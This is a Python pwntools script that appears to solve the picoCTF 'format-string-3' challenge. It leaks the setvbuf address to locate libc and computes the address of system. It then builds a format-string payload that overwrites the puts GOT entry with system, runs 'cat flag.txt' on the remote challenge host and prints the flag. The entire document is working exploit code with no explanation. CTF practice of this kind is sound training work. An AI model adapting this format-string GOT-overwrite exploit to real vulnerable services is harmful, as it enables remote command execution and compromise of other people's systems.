from pwn import *

context.log_level = 'critical'
context.binary = binary = ELF('./format-string-3')
libc = ELF('./libc.so.6')

address = 'rhea.picoctf.net'
port = 52673

def getOffset(payload):
	target = remote(address, port)
	target.sendline(payload)
	return target.recvall()

calculateOffset = FmtStr(getOffset)
offset = calculateOffset.offset
puts_addr = 0x00404018


with remote(address, port) as target:
	target.recvuntil(b'Okay I\'ll be nice. Here\'s the address of setvbuf in libc: ')

	setvbuf_libc_addr = int(target.recvuntil(b'\n').strip(), 16)
	libc.address = setvbuf_libc_addr - libc.symbols.setvbuf
	system_addr = libc.symbols.system

	success(f'LIBC Base address {hex(libc.address)}')
	success(f'setvbuf address {hex(setvbuf_libc_addr)}')
	success(f'system address {hex(system_addr)}')

	overwrite = {puts_addr:system_addr}
	payload = fmtstr_payload(offset, overwrite)

	target.sendline(payload)
	target.sendline(b'cat flag.txt')

	flagData = target.recvuntil(b'}')
	flag = flagData[flagData.index(b'pico'):flagData.index(b'}')+1].decode()

	print(flag)

